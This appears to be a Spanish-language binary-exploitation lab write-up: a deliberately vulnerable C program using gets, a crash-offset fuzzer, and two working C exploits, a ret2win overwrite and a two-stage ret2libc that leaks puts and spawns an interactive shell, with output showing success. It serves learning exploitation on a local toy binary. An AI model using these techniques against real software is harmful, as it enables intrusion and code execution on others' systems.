``` c

#include <stdio.h>
#include <string.h>

void win() {
    puts("has ganado!");
}

void vulnerable() {
    char buffer[64];
    gets(buffer);   // overflow aquí, en stack frame simple
}

int main() {
    vulnerable();
    return 0;
}

```

compilacion:

``` bash

❯ gcc vuln.c -o vuln -fno-stack-protector -no-pie -m32 -Wno-implicit-function-declaration

/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccCWeirH.o: in function `main':
vuln.c:(.text+0x51): warning: the `gets' function is dangerous and should not be used.

```

conseguir direccion en memoria de la funcion wins():

``` bash

❯ objdump -d vuln | grep "win"
08049176 <win>:
╭─ ~/pwn                                                                                                           ✔ ─╮
╰─                                                                                                                   ─╯

```
``` py

import subprocess

for x in range(1, 100):
    payload = "A" * x + "\n"

    proc = subprocess.run(["./vuln"], input=payload, text=True, capture_output=True)

    print(f"Trying {x} -> {proc.returncode}")

    if proc.returncode != 0:
        print(f"{x}")
        break

```

``` bash

❯ python3 fuzz_crash.py
Trying 1 -> 0
Trying 2 -> 0
Trying 3 -> 0
Trying 4 -> 0
Trying 5 -> 0
Trying 6 -> 0
Trying 7 -> 0
Trying 8 -> 0
Trying 9 -> 0
Trying 10 -> 0
Trying 11 -> 0
Trying 12 -> 0
Trying 13 -> 0
Trying 14 -> 0
Trying 15 -> 0
Trying 16 -> 0
Trying 17 -> 0
Trying 18 -> 0
Trying 19 -> 0
Trying 20 -> 0
Trying 21 -> 0
Trying 22 -> 0
Trying 23 -> 0
Trying 24 -> 0
Trying 25 -> 0
Trying 26 -> 0
Trying 27 -> 0
Trying 28 -> 0
Trying 29 -> 0
Trying 30 -> 0
Trying 31 -> 0
Trying 32 -> 0
Trying 33 -> 0
Trying 34 -> 0
Trying 35 -> 0
Trying 36 -> 0
Trying 37 -> 0
Trying 38 -> 0
Trying 39 -> 0
Trying 40 -> 0
Trying 41 -> 0
Trying 42 -> 0
Trying 43 -> 0
Trying 44 -> 0
Trying 45 -> 0
Trying 46 -> 0
Trying 47 -> 0
Trying 48 -> 0
Trying 49 -> 0
Trying 50 -> 0
Trying 51 -> 0
Trying 52 -> 0
Trying 53 -> 0
Trying 54 -> 0
Trying 55 -> 0
Trying 56 -> 0
Trying 57 -> 0
Trying 58 -> 0
Trying 59 -> 0
Trying 60 -> 0
Trying 61 -> 0
Trying 62 -> 0
Trying 63 -> 0
Trying 64 -> 0
Trying 65 -> 0
Trying 66 -> 0
Trying 67 -> 0
Trying 68 -> 0
Trying 69 -> 0
Trying 70 -> 0
Trying 71 -> 0
Trying 72 -> -11
72
╭─ ~/pwn                                                                                                           ✔ ─╮
╰─                    

```

``` c

// exploit.c

// stdio.h nos da: printf, fwrite, puts
// string.h nos da: memset, memcpy
// unistd.h nos da: pipe, fork, dup2, execv, write, close
// stdlib.h nos da: exit
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// #define es una constante — el compilador sustituye WIN_ADDR
// por este número en todo el código antes de compilar.
// Esta dirección la sacas con: objdump -d vuln | grep win
#define WIN_ADDR 0x08049172

int main() {

    // pipe() crea dos extremos de un tubo de comunicación:
    // fds[0] = extremo de lectura  (quien recibe datos)
    // fds[1] = extremo de escritura (quien envía datos)
    int fds[2];
    pipe(fds);

    // fork() divide el proceso en dos:
    // - en el proceso hijo  devuelve 0
    // - en el proceso padre devuelve el PID del hijo
    // A partir de aquí hay DOS procesos ejecutando este código
    pid_t pid = fork();

    if (pid == 0) {
        // --- PROCESO HIJO: va a ejecutar ./vuln ---

        // dup2 duplica un file descriptor.
        // Aquí hacemos que el stdin (fd 0) del hijo
        // sea el extremo de lectura del pipe.
        // Cuando vuln llame a gets(), leerá del pipe.
        dup2(fds[0], 0);

        // Cerramos los dos extremos del pipe en el hijo
        // porque ya no los necesitamos directamente
        close(fds[0]);
        close(fds[1]);

        // execv reemplaza este proceso por ./vuln
        // El hijo deja de ser exploit.c y pasa a ser vuln
        // El array argv termina siempre en NULL
        char *args[] = { "./vuln", NULL };
        execv("./vuln", args);

        // Si execv falla (por ejemplo, vuln no existe)
        // llegamos aquí y avisamos
        perror("execv fallo");
        exit(1);
    }

    // --- PROCESO PADRE: construye y envía el payload ---

    // Cerramos el extremo de lectura en el padre
    // porque el padre solo va a escribir, no leer
    close(fds[0]);

    // Declaramos el array de bytes que será nuestro payload
    // 72 bytes: 64 buffer + 4 saved EBP + 4 EIP
    unsigned char payload[72];

    // memset rellena un bloque de memoria con un valor.
    // Aquí ponemos 'A' (0x41) en los primeros 68 bytes:
    // 64 bytes del buffer + 4 del saved EBP
    memset(payload, 'A', 68);

    // Sobreescribimos los últimos 4 bytes con WIN_ADDR
    // Lo escribimos en little-endian: byte menos significativo primero
    // >> desplaza bits a la derecha, & 0xFF coge solo el último byte
    payload[68] = (WIN_ADDR >> 0)  & 0xFF;  // byte 1 (menos significativo)
    payload[69] = (WIN_ADDR >> 8)  & 0xFF;  // byte 2
    payload[70] = (WIN_ADDR >> 16) & 0xFF;  // byte 3
    payload[71] = (WIN_ADDR >> 24) & 0xFF;  // byte 4 (más significativo)

    // write escribe los 72 bytes del payload
    // en el extremo de escritura del pipe (fds[1])
    // El hijo (vuln) lo recibirá por su stdin
    write(fds[1], payload, 72);

    // Cerramos el extremo de escritura del padre
    // Esto le indica al hijo que no hay más datos (EOF)
    // Sin este close, gets() se quedaría esperando para siempre
    close(fds[1]);

    // wait hace que el padre espere a que el hijo termine
    // Sin esto, el padre podría salir antes que vuln imprima nada
    wait(NULL);

    return 0;
}

```


``` bash

gcc exploit.c -o exploit -m32

```

``` bash

❯ ./exploit
has ganado!
╭─ ~/pwn                                                                                                           ✔ ─╮
╰─                                                                                                                   ─╯

```

``` c

// exploit2.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <pty.h>

#define PUTS_PLT    0x08049050
#define PUTS_GOT    0x0804c008
#define VULNERABLE  0x080491a1

#define PUTS_OFFSET   0x0007e080
#define SYSTEM_OFFSET 0x000537f0
#define EXIT_OFFSET   0x000400c0
#define BINSH_OFFSET  0x001c8e52

int main() {
    int in_fd[2];
    int master, slave;

    pipe(in_fd);
    openpty(&master, &slave, NULL, NULL, NULL);

    pid_t pid = fork();

    if (pid == 0) {
        dup2(in_fd[0], STDIN_FILENO);
        dup2(slave,    STDOUT_FILENO);
        dup2(slave,    STDERR_FILENO);
        close(in_fd[0]); close(in_fd[1]);
        close(master);   close(slave);

        char *args[] = { "./vuln", NULL };
        execv("./vuln", args);
        exit(1);
    }

    close(in_fd[0]);
    close(slave);

    // ── FASE 1: leak puts() ──────────────────────────────────────
    unsigned char p1[89];
    memset(p1, 'A', 76);
    *(uint32_t*)(p1 + 76) = PUTS_PLT;
    *(uint32_t*)(p1 + 80) = VULNERABLE;
    *(uint32_t*)(p1 + 84) = PUTS_GOT;
    p1[88] = '\n';

    write(in_fd[1], p1, 89);

    unsigned char leaked[5] = {0};
    read(master, leaked, 5);

    uint32_t puts_real   = *(uint32_t*)leaked;
    uint32_t libc_base   = puts_real   - PUTS_OFFSET;
    uint32_t system_addr = libc_base   + SYSTEM_OFFSET;
    uint32_t exit_addr   = libc_base   + EXIT_OFFSET;
    uint32_t binsh_addr  = libc_base   + BINSH_OFFSET;

    printf("[*] puts()    leak → 0x%08x\n", puts_real);
    printf("[*] libc base      → 0x%08x\n", libc_base);
    printf("[*] system()       → 0x%08x\n", system_addr);

    // ── FASE 2: ret2libc con direcciones reales ──────────────────
    unsigned char p2[89];
    memset(p2, 'A', 76);
    *(uint32_t*)(p2 + 76) = system_addr;
    *(uint32_t*)(p2 + 80) = exit_addr;
    *(uint32_t*)(p2 + 84) = binsh_addr;
    p2[88] = '\n';

    write(in_fd[1], p2, 89);
    sleep(1);

    // ── Shell interactiva ────────────────────────────────────────
    printf("[+] shell lista\n");
    fd_set fds;
    char buf[256];
    int n;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(master, &fds);
        select(master + 1, &fds, NULL, NULL, NULL);

        if (FD_ISSET(STDIN_FILENO, &fds)) {
            n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n <= 0) break;
            write(in_fd[1], buf, n);
        }
        if (FD_ISSET(master, &fds)) {
            n = read(master, buf, sizeof(buf));
            if (n <= 0) break;
            write(STDOUT_FILENO, buf, n);
        }
    }

    close(in_fd[1]);
    waitpid(pid, NULL, 0);
    return 0;
}

```

``` bash

❯ ./exploit1
[*] puts()    leak → 0xf7dc4080
[*] libc base      → 0xf7d46000
[*] system()       → 0xf7d997f0
[+] shell lista

echo "hola"
hola
pwd
/home/joel/pwn

```
